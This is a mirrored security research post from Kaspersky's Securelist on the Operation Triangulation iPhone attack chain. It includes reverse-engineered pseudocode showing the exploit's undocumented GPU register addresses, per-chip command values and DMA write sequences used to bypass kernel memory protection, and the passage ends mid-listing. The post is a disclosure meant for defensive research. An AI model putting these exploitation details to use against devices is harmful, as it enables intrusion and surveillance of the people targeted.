<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://securelist.com/operation-triangulation-the-last-hardware-mystery/111669/">Original</a>
    <h1>Operation Triangulation: What You Get When Attack iPhones of Researchers</h1>
    
    <div id="readability-page-1" class="page"><div>
	
			<section>
				<div>
					<article>
						<header>
							<figure>
								<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-800x450.jpg" alt="" decoding="async" fetchpriority="high" srcset="" sizes="(max-width: 800px) 100vw, 800px" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-800x450.jpg" data-srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-800x450.jpg 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-300x169.jpg 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-1024x576.jpg 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-768x432.jpg 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-622x350.jpg 622w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-740x416.jpg 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-498x280.jpg 498w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware.jpg 1200w"/>							</figure>
														<p>
								<a href="https://securelist.com/category/research/">Research</a>
							</p>
																					<div>
																<p>
									<a href="https://securelist.com/category/research/">Research</a>
								</p>
																<p><time datetime="2023-12-27T14:00:43+00:00">27 Dec 2023</time></p>
								<p>
									<svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-hourglass"></use></svg> <span></span> minute read								</p>
							</div>
						</header>

						<div>

							<div>

																
								
								<div>
									<div>
										<div>
											<figure>
												<img width="1200" height="600" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-1200x600.jpg" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-1200x600.jpg" data-srcset="" srcset=""/>											</figure>

											

											
											<div>
												<div>
													<p>Today, on December 27, 2023, we (<a href="https://twitter.com/oct0xor" target="_blank" rel="noopener">Boris Larin</a>, <a href="https://twitter.com/bzvr_" target="_blank" rel="noopener">Leonid Bezvershenko</a>, and <a href="https://twitter.com/kucher1n" target="_blank" rel="noopener">Georgy Kucherin</a>) delivered a presentation, titled, “Operation Triangulation: What You Get When Attack iPhones of Researchers”, at the 37th Chaos Communication Congress (37C3), held at Congress Center Hamburg. The presentation summarized the results of our long-term research into Operation Triangulation, conducted with our colleagues, <a href="https://twitter.com/2igosha" target="_blank" rel="noopener">Igor Kuznetsov</a>, <a href="https://securelist.com/author/valentinpashkov/" target="_blank" rel="noopener">Valentin Pashkov</a>, and <a href="https://securelist.com/author/mikhailvinogradov/" rel="noopener" target="_blank">Mikhail Vinogradov</a>.</p>
<p>This presentation was also the first time we had publicly disclosed the details of all exploits and vulnerabilities that were used in the attack. We discover and analyze new exploits and attacks using these on a daily basis, and we have discovered and reported more than thirty in-the-wild zero-days in Adobe, Apple, Google, and Microsoft products, but this is definitely the most sophisticated attack chain we have ever seen.</p>
<h2 id="operation-triangulation-attack-chain">Operation Triangulation’ attack chain</h2>
<p>Here is a quick rundown of this 0-click iMessage attack, which used four zero-days and was designed to work on iOS versions up to iOS 16.2.</p>
<ul>
<li>Attackers send a malicious iMessage attachment, which the application processes without showing any signs to the user.</li>
<li>This attachment exploits the remote code execution vulnerability <a href="https://support.apple.com/en-us/HT213842" target="_blank" rel="noopener">CVE-2023-41990</a> in the undocumented, Apple-only ADJUST TrueType font instruction. This instruction had existed since the early nineties before a patch removed it.</li>
<li>It uses return/jump oriented programming and multiple stages written in the NSExpression/NSPredicate query language, patching the JavaScriptCore library environment to execute a privilege escalation exploit written in JavaScript.</li>
<li>This JavaScript exploit is obfuscated to make it completely unreadable and to minimize its size. Still, it has around 11,000 lines of code, which are mainly dedicated to JavaScriptCore and kernel memory parsing and manipulation.</li>
<li>It exploits the JavaScriptCore debugging feature DollarVM ($vm) to gain the ability to manipulate JavaScriptCore’s memory from the script and execute native API functions.</li>
<li>It was designed to support both old and new iPhones and included a Pointer Authentication Code (PAC) bypass for exploitation of recent models.</li>
<li>It uses the integer overflow vulnerability <a href="https://support.apple.com/en-us/103837" target="_blank" rel="noopener">CVE-2023-32434</a> in XNU’s memory mapping syscalls (mach_make_memory_entry and vm_map) to obtain read/write access to the entire physical memory of the device at user level.</li>
<li>It uses hardware memory-mapped I/O (MMIO) registers to bypass the Page Protection Layer (PPL). This was mitigated as <a href="https://support.apple.com/en-us/HT213841" target="_blank" rel="noopener">CVE-2023-38606</a>.</li>
<li>After exploiting all the vulnerabilities, the JavaScript exploit can do whatever it wants to the device including running spyware, but the attackers chose to: (a) launch the IMAgent process and inject a payload that clears the exploitation artefacts from the device; (b) run a Safari process in invisible mode and forward it to a web page with the next stage.</li>
<li>The web page has a script that verifies the victim and, if the checks pass, receives the next stage: the Safari exploit.</li>
<li>The Safari exploit uses <a href="https://support.apple.com/en-us/HT213676" target="_blank" rel="noopener">CVE-2023-32435</a> to execute a shellcode.</li>
<li>The shellcode executes another kernel exploit in the form of a Mach object file. It uses the same vulnerabilities: <a href="https://support.apple.com/en-us/103837" target="_blank" rel="noopener">CVE-2023-32434</a> and <a href="https://support.apple.com/en-us/HT213841" target="_blank" rel="noopener">CVE-2023-38606</a>. It is also massive in terms of size and functionality, but completely different from the kernel exploit written in JavaScript. Certain parts related to exploitation of the above-mentioned vulnerabilities are all that the two share. Still, most of its code is also dedicated to parsing and manipulation of the kernel memory. It contains various post-exploitation utilities, which are mostly unused.</li>
<li>The exploit obtains root privileges and proceeds to execute other stages, which load spyware. We covered these stages in our previous <a href="https://securelist.com/trng-2023/" target="_blank" rel="noopener">posts</a>.</li>
</ul>
<p>We are almost done reverse-engineering every aspect of this attack chain, and we will be releasing a series of articles next year detailing each vulnerability and how it was exploited.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01.png" alt="" width="1920" height="1080" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01.png 1920w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-300x169.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-1024x576.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-768x432.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-1536x864.png 1536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-800x450.png 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-622x350.png 622w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-740x416.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-498x280.png 498w" sizes="(max-width: 1920px) 100vw, 1920px"/></a></p>
<p>However, there are certain aspects to one particular vulnerability that we have not been able to fully understand. </p>
<h2 id="the-mystery-and-the-cve-2023-38606-vulnerability">The mystery and the CVE-2023-38606 vulnerability</h2>
<p>What we want to discuss is related to the vulnerability that has been mitigated as <a href="https://support.apple.com/en-us/HT213841" target="_blank" rel="noopener">CVE-2023-38606</a>. Recent iPhone models have additional hardware-based security <a href="https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/web" target="_blank" rel="noopener">protection</a> for sensitive regions of the kernel memory. This protection prevents attackers from obtaining full control over the device if they can read and write kernel memory, as achieved in this attack by exploiting <a href="https://support.apple.com/en-us/103837" target="_blank" rel="noopener">CVE-2023-32434</a>. We discovered that to bypass this hardware-based security protection, the attackers used another hardware feature of Apple-designed <a href="https://en.wikipedia.org/wiki/System_on_a_chip" target="_blank" rel="noopener">SoCs</a>.</p>
<p>If we try to describe this feature and how the attackers took advantage of it, it all comes down to this: they are able to write data to a certain physical address while bypassing the hardware-based memory protection by writing the data, destination address, and data hash to unknown hardware registers of the chip unused by the firmware.</p>
<p>Our guess is that this unknown hardware feature was most likely intended to be used for debugging or testing purposes by Apple engineers or the factory, or that it was included by mistake. Because this feature is not used by the firmware, we have no idea how attackers would know how to use it.</p>
<p>We are publishing the technical details, so that other iOS security researchers can confirm our findings and come up with possible explanations of how the attackers learned about this hardware feature.</p>
<h2 id="technical-details">Technical details</h2>
<p>Various peripheral devices available in the SoC may provide special hardware registers that can be used by the CPU to operate these devices. For this to work, these hardware registers are mapped to the memory accessible by the CPU and are known as “<a href="https://en.wikipedia.org/wiki/Memory-mapped_I/O_and_port-mapped_I/O" target="_blank" rel="noopener">memory-mapped I/O (MMIO)</a>“.</p>
<p>Address ranges for MMIOs of peripheral devices in Apple products (iPhones, Macs, and others) are stored in a special file format: <a href="https://www.theiphonewiki.com/wiki/DeviceTree" target="_blank" rel="noopener">DeviceTree</a>. Device tree files can be extracted from the firmware, and their contents can be viewed with the help of the <a href="https://github.com/Siguza/dt" target="_blank" rel="noopener">dt</a> utility.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130932/trng_final_mystery_en_02.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130932/trng_final_mystery_en_02.png" alt="" width="657" height="201" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130932/trng_final_mystery_en_02.png 657w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130932/trng_final_mystery_en_02-300x92.png 300w" sizes="(max-width: 657px) 100vw, 657px"/></a></p>
<p><em>Example of how MMIO ranges are stored in the device tree</em></p>
<p>For example, in this screenshot, you can see the start (0x210f00000) and the size (0x50000) of the acc-impl MMIO range for cpu0.</p>
<p>While analyzing the exploit used in the Operation Triangulation attack, I discovered that most of the MMIOs used by the attackers to bypass the hardware-based kernel memory protection do not belong to any MMIO ranges defined in the device tree. The exploit targets Apple A12–A16 Bionic SoCs, targeting unknown MMIO blocks of registers that are located at the following addresses: 0x206040000, 0x206140000, and 0x206150000.</p>
<p>The prompted me to try something. I checked different device tree files for different devices and different firmware files: no luck. I checked publicly available source code: no luck. I checked the kernel images, kernel extensions, iboot, and coprocessor firmware in search of a direct reference to these addresses: nothing.</p>
<p>How could it be that that the exploit used MMIOs that were not used by the firmware? How did the attackers find out about them? What peripheral device(s) do these MMIO addresses belong to?</p>
<p>It occurred to me that I should check what other known MMIOs were located in the area close to these unknown MMIO blocks. That approach was successful.</p>
<p>Let us take a look at a dump of the device tree entry for gfx-asc, which is the GPU coprocessor.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130936/trng_final_mystery_en_03.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130936/trng_final_mystery_en_03.png" alt="" width="584" height="259" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130936/trng_final_mystery_en_03.png 584w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130936/trng_final_mystery_en_03-300x133.png 300w" sizes="(max-width: 584px) 100vw, 584px"/></a></p>
<p><em>Dump of the device tree entry for gfx-asc</em></p>
<p>It has two MMIO ranges: 0x206400000–0x20646C000 and 0x206050000–0x206050008. Let us take a look at how they correlate with the regions used by the exploit.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04.png" alt="" width="1920" height="902" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04.png 1920w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-300x141.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-1024x481.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-768x361.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-1536x722.png 1536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-745x350.png 745w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-740x348.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-596x280.png 596w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-800x376.png 800w" sizes="(max-width: 1920px) 100vw, 1920px"/></a></p>
<p><em>Correlation of the gfx-asc MMIO ranges and the addresses used by the exploit</em></p>
<p>To be more precise, the exploit uses the following unknown addresses: 0x206040000, 0x206140008, 0x206140108, 0x206150020, 0x206150040, and 0x206150048. We can see that most of these are located in the area between the two gfx-asc regions, and the remaining one is located close to the beginning of the first gfx-asc region. This suggested that all these MMIO registers most likely belonged to the GPU coprocessor!</p>
<p>After that, I took a closer look at the exploit and found one more thing that confirmed my theory. The first thing the exploit does during initialization is writing to some other MMIO register, which is located at a different address for each SoC.</p>
		<div id="crayon-658c436cedc7c865632623" data-settings=" minimize scroll-mouseover">
		
			
			
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p></div>
				</td>
						<td><div><p><span>if</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x8765EDEA</span><span>)</span><span>:</span><span>   </span><span># CPUFAMILY_ARM_EVEREST_SAWTOOTH (A16)</span></p><p><span>    </span><span>base</span><span> </span>=<span> </span><span>0x23B700408</span></p><p><span>    </span><span>command</span><span> </span>=<span> </span><span>0x1F0023FF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0xDA33D83D</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_AVALANCHE_BLIZZARD (A15)</span></p><p><span>    </span><span>base</span><span> </span>=<span> </span><span>0x23B7003C8</span></p><p><span>    </span><span>command</span><span> </span>=<span> </span><span>0x1F0023FF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x1B588BB3</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_FIRESTORM_ICESTORM (A14)</span></p><p><span>    </span><span>base</span><span> </span>=<span> </span><span>0x23B7003D0</span></p><p><span>    </span><span>command</span><span> </span>=<span> </span><span>0x1F0023FF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x462504D2</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_LIGHTNING_THUNDER (A13)</span></p><p><span>    </span><span>base</span><span> </span>=<span> </span><span>0x23B080390</span></p><p><span>    </span><span>command</span><span> </span>=<span> </span><span>0x1F0003FF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x07D34B9F</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_VORTEX_TEMPEST (A12)</span></p><p><span>    </span><span>base</span><span> </span>=<span> </span><span>0x23B080388</span></p><p><span>    </span><span>command</span><span> </span>=<span> </span><span>0x1F0003FF</span></p><p><span>if</span><span> </span><span>(</span><span>(</span><span>~</span><span>read_dword</span><span>(</span><span>base</span><span>)</span><span> </span>&amp;<span> </span><span>0xF</span><span>)</span><span> </span><span>!</span>=<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>    </span><span>write_dword</span><span>(</span><span>base</span><span>,</span><span> </span><span>command</span><span>)</span></p><p><span>    </span><span>while</span><span>(</span><span>True</span><span>)</span><span>:</span></p><p><span>        </span><span>if</span><span> </span><span>(</span><span>(</span><span>~</span><span>read_dword</span><span>(</span><span>base</span><span>)</span><span> </span>&amp;<span> </span><span>0xF</span><span>)</span><span> </span>==<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>            </span><span>break</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div><p><em>Pseudocode for the GFX power manager control code from the exploit</em></p>
<p>With the help of the device tree and Siguza’s utility, <a href="https://github.com/Siguza/dt" target="_blank" rel="noopener">pmgr</a>, I was able to discover that all these addresses corresponded to the GFX register in the power manager MMIO range.</p>
<p>Finally, I obtained a third confirmation when I decided to try and access the registers located in these unknown regions. Almost instantly, the GPU coprocessor panicked with a message of, “GFX SERROR Exception class=0x2f (SError interrupt), IL=1, iss=0 – power(1)”.</p>
<p>This way, I was able to confirm that all these unknown MMIO registers used for the exploitation belonged to the GPU coprocessor. This motivated me to take a deeper look at its firmware, which is also written in ARM and unencrypted, but I could not find anything related to these registers in there.</p>
<p>I decided to take a closer look at how the exploit operated these unknown MMIO registers. The register 0x206040000 stands out from all the others because it is located in a separate MMIO block from all the other registers. It is touched only during the initialization and finalization stages of the exploit: it is the first register to be set during initialization and the last one, during finalization. From my experience, it was clear that the register either enabled/disabled the hardware feature used by the exploit or controlled interrupts. I started to follow the interrupt route, and fairly soon, I was able to recognize this unknown register, 0x206040000, and also discovered what exactly was mapped to the address range of 0x206000000–0x206050000. Below, you can see the reverse-engineered code of the exploit that I was able to recognize. I have given it a proper name.</p>
		<div id="crayon-658c436cedc82259056594" data-settings=" minimize scroll-mouseover">
		
			
			
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p></div>
				</td>
						<td><div><p><span>def </span><span>ml_dbgwrap_halt_cpu</span><span>(</span><span>)</span><span>:</span></p><p><span>    </span><span>value</span><span> </span>=<span> </span><span>read_qword</span><span>(</span><span>0x206040000</span><span>)</span></p><p><span>    </span><span>if</span><span> </span><span>(</span><span>(</span><span>value</span><span> </span>&amp;<span> </span><span>0x90000000</span><span>)</span><span> </span><span>!</span>=<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>        </span><span>return</span></p><p><span>    </span><span>write_qword</span><span>(</span><span>0x206040000</span><span>,</span><span> </span><span>value</span><span> </span><span>|</span><span> </span><span>0x80000000</span><span>)</span></p><p><span>    </span><span>while</span><span> </span><span>(</span><span>True</span><span>)</span><span>:</span></p><p><span>        </span><span>if</span><span> </span><span>(</span><span>(</span><span>read_qword</span><span>(</span><span>0x206040000</span><span>)</span><span> </span>&amp;<span> </span><span>0x10000000</span><span>)</span><span> </span><span>!</span>=<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>            </span><span>break</span></p><p><span>def </span><span>ml_dbgwrap_unhalt_cpu</span><span>(</span><span>)</span><span>:</span></p><p><span>    </span><span>value</span><span> </span>=<span> </span><span>read_qword</span><span>(</span><span>0x206040000</span><span>)</span></p><p><span>    </span><span>value</span><span> </span>=<span> </span><span>(</span><span>value</span><span> </span>&amp;<span> </span><span>0xFFFFFFFF2FFFFFFF</span><span>)</span><span> </span><span>|</span><span> </span><span>0x40000000</span></p><p><span>    </span><span>write_qword</span><span>(</span><span>0x206040000</span><span>,</span><span> </span><span>value</span><span>)</span></p><p><span>    </span><span>while</span><span> </span><span>(</span><span>True</span><span>)</span><span>:</span></p><p><span>        </span><span>if</span><span> </span><span>(</span><span>(</span><span>read_qword</span><span>(</span><span>0x206040000</span><span>)</span><span> </span>&amp;<span> </span><span>0x10000000</span><span>)</span><span> </span>==<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>            </span><span>break</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div><p><em>Pseudocode for the usage of the, 0x206040000 register by the exploit</em></p>
<p>I was able to match the ml_dbgwrap_halt_cpu function from the pseudocode above to a function with the same name in the dbgwrap.c file of the XNU source code. This file contains code for working with the ARM <a href="https://developer.arm.com/Architectures/CoreSight%20Architecture" target="_blank" rel="noopener">CoreSight</a> MMIO debug registers of the main CPU. The source code states that there are four CoreSight-related MMIO regions, named ED, CTI, PMU, and UTT. Each  occupies 0x10000 bytes, and they are all located next to one another. The ml_dbgwrap_halt_cpu function uses the UTT region, and the source code states that, unlike the other three, it does not come from ARM, but is a proprietary Apple feature that was added just for convenience.</p>
<p>I was able to confirm that 0x206000000–0x206050000 was indeed a block of CoreSight MMIO debug registers for the GPU coprocessor by writing ARM_DBG_LOCK_ACCESS_KEY to the corresponding location. Each core of the main CPU has its own block of CoreSight MMIO debug registers, but unlike the GPU coprocessor, their addresses can be found in the device tree.</p>
<p>It is also interesting that the author(s) of this exploit knew how to use the proprietary Apple UTT region to unhalt the CPU: this code is not part of the XNU source code. Perhaps it is fair to say that this could easily be found out through experimentation.</p>
<p>Something that cannot be found that way is what the attackers did with the registers in the second unknown region. I am not sure what blocks of MMIO debug registers are located there, or how the attackers found out how to use them if they were not used by the firmware.</p>
<p>Let us look at the remaining unknown registers used by the exploit.</p>
<p>The registers 0x206140008 and 0x206140108 control enabling/disabling and running the hardware feature used by the exploit.</p>
		<div id="crayon-658c436cedc84901682722" data-settings=" minimize scroll-mouseover">
		
			
			
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p><p>31</p><p>32</p><p>33</p><p>34</p><p>35</p><p>36</p><p>37</p><p>38</p><p>39</p><p>40</p><p>41</p><p>42</p><p>43</p><p>44</p><p>45</p><p>46</p><p>47</p><p>48</p></div>
				</td>
						<td><div><p><span>def </span><span>dma_ctrl_1</span><span>(</span><span>)</span><span>:</span></p><p><span>    </span><span>ctrl</span><span> </span>=<span> </span><span>0x206140108</span></p><p><span>    </span><span>value</span><span> </span>=<span> </span><span>read_qword</span><span>(</span><span>ctrl</span><span>)</span></p><p><span>    </span><span>write_qword</span><span>(</span><span>ctrl</span><span>,</span><span> </span><span>value</span><span> </span><span>|</span><span> </span><span>0x8000000000000001</span><span>)</span></p><p><span>    </span><span>sleep</span><span>(</span><span>1</span><span>)</span></p><p><span>    </span><span>while</span><span> </span><span>(</span><span>(</span><span>~</span><span>read_qword</span><span>(</span><span>ctrl</span><span>)</span><span> </span>&amp;<span> </span><span>0x8000000000000001</span><span>)</span><span> </span><span>!</span>=<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>        </span><span>sleep</span><span>(</span><span>1</span><span>)</span></p><p><span>def </span><span>dma_ctrl_2</span><span>(</span><span>flag</span><span>)</span><span>:</span></p><p><span>    </span><span>ctrl</span><span> </span>=<span> </span><span>0x206140008</span></p><p><span>    </span><span>value</span><span> </span>=<span> </span><span>read_qword</span><span>(</span><span>ctrl</span><span>)</span></p><p><span>    </span><span>if</span><span> </span><span>(</span><span>flag</span><span>)</span><span>:</span><span> </span></p><p><span>        </span><span>if</span><span> </span><span>(</span><span>(</span><span>value</span><span> </span>&amp;<span> </span><span>0x1000000000000000</span><span>)</span><span> </span>==<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>            </span><span>value</span><span> </span>=<span> </span><span>value</span><span> </span><span>|</span><span> </span><span>0x1000000000000000</span><span> </span></p><p><span>            </span><span>write_qword</span><span>(</span><span>ctrl</span><span>,</span><span> </span><span>value</span><span>)</span></p><p><span>    </span><span>else</span><span>:</span></p><p><span>        </span><span>if</span><span> </span><span>(</span><span>(</span><span>value</span><span> </span>&amp;<span> </span><span>0x1000000000000000</span><span>)</span><span> </span><span>!</span>=<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>            </span><span>value</span><span> </span>=<span> </span><span>value</span><span> </span>&amp;<span> </span><span>~</span><span>0x1000000000000000</span><span> </span></p><p><span>            </span><span>write_qword</span><span>(</span><span>ctrl</span><span>,</span><span> </span><span>value</span><span>)</span></p><p><span>def </span><span>dma_ctrl_3</span><span>(</span><span>value</span><span>)</span><span>:</span></p><p><span>    </span><span>ctrl</span><span> </span>=<span> </span><span>0x206140108</span></p><p><span>    </span><span>value</span><span> </span>=<span> </span><span>value</span><span> </span><span>|</span><span> </span><span>0x8000000000000000</span></p><p><span>    </span><span>write_qword</span><span>(</span><span>ctrl</span><span>,</span><span> </span><span>read_qword</span><span>(</span><span>ctrl</span><span>)</span><span> </span>&amp;<span> </span><span>value</span><span>)</span></p><p><span>    </span><span>while</span><span> </span><span>(</span><span>(</span><span>read_qword</span><span>(</span><span>ctrl</span><span>)</span><span> </span>&amp;<span> </span><span>0x8000000000000001</span><span>)</span><span> </span><span>!</span>=<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>        </span><span>sleep</span><span>(</span><span>1</span><span>)</span></p><p><span>def </span><span>dma_init</span><span>(</span><span>original_value_0x206140108</span><span>)</span><span>:</span></p><p><span>    </span><span>dma_ctrl_1</span><span>(</span><span>)</span></p><p><span>    </span><span>dma_ctrl_2</span><span>(</span><span>False</span><span>)</span></p><p><span>    </span><span>dma_ctrl_3</span><span>(</span><span>original_value_0x206140108</span><span>)</span></p><p><span>def </span><span>dma_done</span><span>(</span><span>original_value_0x206140108</span><span>)</span><span>:</span></p><p><span>    </span><span>dma_ctrl_1</span><span>(</span><span>)</span></p><p><span>    </span><span>dma_ctrl_2</span><span>(</span><span>True</span><span>)</span></p><p><span>    </span><span>dma_ctrl_3</span><span>(</span><span>original_value_0x206140108</span><span>)</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div><p><em>Pseudocode for the usage of the </em>0x206140008 and 0x206140108<em> registers by the exploit</em></p>
<p>The register 0x206150020 is used only for Apple A15/A16 Bionic SoCs. It is set to 1 during the initialization stage of the exploit, and to its original value, during the finalization stage.</p>
<p>The register 0x206150040 is used to store some flags and the lower half of the destination physical address.</p>
<p>The last register, 0x206150048, is used for storing the data that needs to be written and the upper half of the destination physical address, bundled together with the data hash and another value (possibly a command). This hardware feature writes the data in aligned blocks of 0x40 bytes, and everything should be written to the 0x206150048 register in nine sequential writes.</p>
		<div id="crayon-658c436cedc85011028664" data-settings=" minimize scroll-mouseover">
		
			
			
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p><p>31</p><p>32</p><p>33</p><p>34</p><p>35</p><p>36</p><p>37</p></div>
				</td>
						<td><div><p><span>if</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x8765EDEA</span><span>)</span><span>:</span><span>   </span><span># CPUFAMILY_ARM_EVEREST_SAWTOOTH (A16)</span></p><p><span>    </span><span>i</span><span> </span>=<span> </span><span>8</span></p><p><span>    </span><span>mask</span><span> </span>=<span> </span><span>0x7FFFFFF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0xDA33D83D</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_AVALANCHE_BLIZZARD (A15)</span></p><p><span>    </span><span>i</span><span> </span>=<span> </span><span>8</span></p><p><span>    </span><span>mask</span><span> </span>=<span> </span><span>0x3FFFFF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x1B588BB3</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_FIRESTORM_ICESTORM (A14)</span></p><p><span>    </span><span>i</span><span> </span>=<span> </span><span>0x28</span></p><p><span>    </span><span>mask</span><span> </span>=<span> 